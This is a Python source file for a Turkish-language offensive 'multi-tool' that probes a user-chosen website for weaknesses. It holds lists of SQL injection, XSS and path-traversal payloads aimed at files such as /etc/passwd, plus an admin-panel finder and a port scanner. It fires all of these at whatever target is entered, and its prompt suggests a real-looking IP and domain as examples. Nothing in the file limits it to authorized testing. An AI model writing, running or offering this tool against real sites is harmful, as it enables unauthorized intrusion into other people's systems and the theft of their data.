#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║            🛡️  BÜYÜKXAN MULTI-TOOL V3.0  🛡️               ║
║                                                               ║
║          Developer : BüyükXan | Developer Xan                ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝

Kullanım: python3 buyukxan.py
"""

import requests
import sys
import time
import socket
import re
from urllib.parse import urljoin, urlparse
import threading
from datetime import datetime

# Renkler (Terminal için)
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class BuyukXan:
    def __init__(self):
        self.target = ""
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Wordlist'ler
        self.admin_dirs = [
            'admin', 'login', 'panel', 'cpanel', 'whm', 'webmail', 'cp', 'dashboard',
            'administrator', 'phpmyadmin', 'pma', 'mysql', 'db', 'backup', 'tmp',
            'test', 'dev', 'api', 'v1', 'v2', 'v3', 'manager', 'control', 'sys',
            'root', 'super', 'master', 'secure', 'private', 'hidden', 'secret'
        ]
        
        self.sql_payloads = [
            ("' OR '1'='1", "Temel SQLi"),
            ("' OR 1=1--", "SQLi Yorum"),
            ("' UNION SELECT NULL--", "Union Tabanlı"),
            ("' AND SLEEP(5)--", "Zaman Tabanlı"),
            ("' OR '1'='1' ;--", "Stacked Sorgu"),
            ("' OR 1=1 LIMIT 1--", "Limit Bypass"),
            ("admin'--", "Login Bypass"),
            ("' OR 'a'='a", "Boolean Tabanlı"),
            ("' UNION SELECT NULL,NULL--", "Union 2 Sütun"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union 3 Sütun"),
        ]
        
        self.common_ports = [80, 443, 22, 21, 25, 3306, 8080, 8443, 2082, 2083, 2086, 2087, 2096, 1433, 5432, 6379, 27017]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
        ]
        
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "....//....//....//etc/passwd",
            "../../../../../../../../etc/passwd",
        ]
    
    def print_banner(self):
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.YELLOW}🛡️  BÜYÜKXAN MULTI-TOOL V3.0  🛡️{Colors.RED}               ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.CYAN}Developer : BüyükXan | Developer Xan{Colors.RED}         ║
{Colors.RED}║                                                               ║
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════╗
║                    ANA MENÜ                              ║
╠════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}1{Colors.RESET}{Colors.BLUE}) SQL Injection Taraması                    ║
║  {Colors.YELLOW}2{Colors.RESET}{Colors.BLUE}) Admin Panel Bulucu                        ║
║  {Colors.YELLOW}3{Colors.RESET}{Colors.BLUE}) Port Taraması                            ║
║  {Colors.YELLOW}4{Colors.RESET}{Colors.BLUE}) XSS Taraması                             ║
║  {Colors.YELLOW}5{Colors.RESET}{Colors.BLUE}) LFI/RFI Taraması                         ║
║  {Colors.YELLOW}6{Colors.RESET}{Colors.BLUE}) Tümünü Yap (Full Scan)                   ║
║  {Colors.YELLOW}7{Colors.RESET}{Colors.BLUE}) Hedef Bilgileri (Info)                   ║
║  {Colors.YELLOW}0{Colors.RESET}{Colors.BLUE}) Çıkış                                    ║
╚════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(menu)
    
    def set_target(self):
        print(f"{Colors.CYAN}[+] Hedef IP veya URL gir (örn: 173.201.76.29 veya https://10000frogs.com):{Colors.RESET}")
        self.target = input("➜ ").strip()
        
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        
        print(f"{Colors.GREEN}[+] Hedef: {self.target}{Colors.RESET}\n")
    
    def test_sql_injection(self):
        print(f"\n{Colors.CYAN}[+] SQL Injection Taraması Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        # Parametreleri tespit et
        params = ['id', 'page', 'user', 'file', 'cat', 'product', 'article', 'news', 'detail', 'q', 'search']
        
        found = False
        
        for param in params:
            for payload, desc in self.sql_payloads:
                test_url = f"{self.target}?{param}={payload}"
                try:
                    start = time.time()
                    r = self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start
                    
                    # 1. Hata mesajı kontrolü
                    errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'microsoft ole db', 
                             'driver', 'syntax error', 'warning', 'mysqli', 'PDO', 'SQLSTATE']
                    
                    if any(e in r.text.lower() for e in errors):
                        print(f"{Colors.GREEN}✅ SQL HATASI BULUNDU!{Colors.RESET}")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        print(f"   {Colors.RED}Hata: {r.text[:150]}{Colors.RESET}\n")
                        found = True
                    
                    # 2. Zaman tabanlı
                    if elapsed > 4:
                        print(f"{Colors.GREEN}✅ ZAMAN TABANLI SQLI BULUNDU!{Colors.RESET}")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        print(f"   Yanıt süresi: {elapsed:.2f} sn\n")
                        found = True
                    
                except Exception as e:
                    pass
        
        if not found:
            print(f"{Colors.RED}❌ SQL Injection bulunamadı.{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Site statik olabilir veya parametreler çalışmıyor.{Colors.RESET}\n")
    
    def find_admin_panels(self):
        print(f"\n{Colors.CYAN}[+] Admin Panel Bulucu Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        found = []
        for directory in self.admin_dirs:
            test_url = urljoin(self.target, directory + '/')
            try:
                r = self.session.get(test_url, timeout=5)
                if r.status_code == 200:
                    print(f"{Colors.GREEN}✅ PANEL BULUNDU!{Colors.RESET}")
                    print(f"   URL: {test_url}")
                    print(f"   Durum: {r.status_code}")
                    print(f"   Boyut: {len(r.text)} byte\n")
                    found.append(test_url)
                elif r.status_code == 403:
                    print(f"{Colors.YELLOW}⚠️  Panel var ama erişim yasak: {test_url}{Colors.RESET}")
                    found.append(test_url)
                elif r.status_code in [301, 302, 307, 308]:
                    print(f"{Colors.YELLOW}⚠️  Panel yönlendiriyor: {test_url} -> {r.headers.get('Location', '?')}{Colors.RESET}")
                    found.append(test_url)
            except:
                pass
        
        if not found:
            print(f"{Colors.RED}❌ Admin paneli bulunamadı.{Colors.RESET}\n")
    
    def port_scan(self):
        print(f"\n{Colors.CYAN}[+] Port Taraması Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef IP: {self.target.replace('http://', '').replace('https://', '').split('/')[0]}{Colors.RESET}\n")
        
        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        open_ports = []
        
        for port in self.common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    print(f"{Colors.GREEN}✅ PORT {port}: AÇIK{Colors.RESET}")
                    open_ports.append(port)
                else:
                    print(f"{Colors.RED}   PORT {port}: KAPALI{Colors.RESET}")
            except:
                pass
        
        if open_ports:
            print(f"\n{Colors.CYAN}[+] Açık Portlar: {open_ports}{Colors.RESET}\n")
    
    def test_xss(self):
        print(f"\n{Colors.CYAN}[+] XSS Taraması Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        params = ['id', 'page', 'user', 'q', 'search', 'name', 'comment']
        found = False
        
        for param in params:
            for payload in self.xss_payloads:
                test_url = f"{self.target}?{param}={payload}"
                try:
                    r = self.session.get(test_url, timeout=5)
                    if payload in r.text or payload.lower() in r.text.lower():
                        print(f"{Colors.GREEN}✅ XSS BULUNDU!{Colors.RESET}")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}\n")
                        found = True
                except:
                    pass
        
        if not found:
            print(f"{Colors.RED}❌ XSS bulunamadı.{Colors.RESET}\n")
    
    def test_lfi(self):
        print(f"\n{Colors.CYAN}[+] LFI/RFI Taraması Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        params = ['file', 'page', 'include', 'path', 'doc']
        found = False
        
        for param in params:
            for payload in self.lfi_payloads:
                test_url = f"{self.target}?{param}={payload}"
                try:
                    r = self.session.get(test_url, timeout=5)
                    if 'root:' in r.text or '[extensions]' in r.text or 'boot loader' in r.text:
                        print(f"{Colors.GREEN}✅ LFI BULUNDU!{Colors.RESET}")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        print(f"   {Colors.RED}Veri: {r.text[:200]}{Colors.RESET}\n")
                        found = True
                    elif len(r.text) > 1000 and ('<?php' in r.text or 'function' in r.text):
                        print(f"{Colors.GREEN}✅ RFI OLABİLİR!{Colors.RESET}")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}\n")
                        found = True
                except:
                    pass
        
        if not found:
            print(f"{Colors.RED}❌ LFI/RFI bulunamadı.{Colors.RESET}\n")
    
    def full_scan(self):
        print(f"\n{Colors.BOLD}{Colors.HEADER}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}         📡 FULL SCAN BAŞLATILIYOR 📡{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.HEADER}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        self.port_scan()
        self.find_admin_panels()
        self.test_sql_injection()
        self.test_xss()
        self.test_lfi()
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}         ✅ FULL SCAN TAMAMLANDI!{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}\n")
    
    def get_target_info(self):
        print(f"\n{Colors.CYAN}[+] Hedef Bilgileri Toplanıyor...{Colors.RESET}")
        
        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        
        try:
            ip = socket.gethostbyname(host)
            print(f"{Colors.GREEN}✅ IP Adresi: {ip}{Colors.RESET}")
        except:
            print(f"{Colors.RED}❌ DNS çözümlenemedi{Colors.RESET}")
        
        try:
            r = self.session.get(self.target, timeout=5)
            print(f"{Colors.GREEN}✅ HTTP Durumu: {r.status_code}{Colors.RESET}")
            print(f"{Colors.GREEN}✅ Sunucu: {r.headers.get('Server', 'Bilinmiyor')}{Colors.RESET}")
            print(f"{Colors.GREEN}✅ Content-Type: {r.headers.get('Content-Type', 'Bilinmiyor')}{Colors.RESET}")
        except:
            print(f"{Colors.RED}❌ HTTP bağlantısı başarısız{Colors.RESET}")
        
        print()
    
    def run(self):
        self.print_banner()
        
        while True:
            self.print_menu()
            choice = input(f"{Colors.BOLD}{Colors.CYAN}Seçiminiz (0-7): {Colors.RESET}").strip()
            
            if choice == '0':
                print(f"{Colors.RED}[+] Çıkış yapılıyor...{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.CYAN}Developed by BüyükXan | Developer Xan{Colors.RESET}")
                break
            
            elif choice == '1':
                if not self.target:
                    self.set_target()
                self.test_sql_injection()
            
            elif choice == '2':
                if not self.target:
                    self.set_target()
                self.find_admin_panels()
            
            elif choice == '3':
                if not self.target:
                    self.set_target()
                self.port_scan()
            
            elif choice == '4':
                if not self.target:
                    self.set_target()
                self.test_xss()
            
            elif choice == '5':
                if not self.target:
                    self.set_target()
                self.test_lfi()
            
            elif choice == '6':
                if not self.target:
                    self.set_target()
                self.full_scan()
            
            elif choice == '7':
                if not self.target:
                    self.set_target()
                self.get_target_info()
            
            else:
                print(f"{Colors.RED}❌ Geçersiz seçim!{Colors.RESET}")
            
            input(f"\n{Colors.YELLOW}[*] Devam etmek için Enter tuşuna bas...{Colors.RESET}")

if __name__ == "__main__":
    try:
        tool = BuyukXan()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[+] Kullanıcı tarafından durduruldu.{Colors.RESET}")
        sys.exit(0)
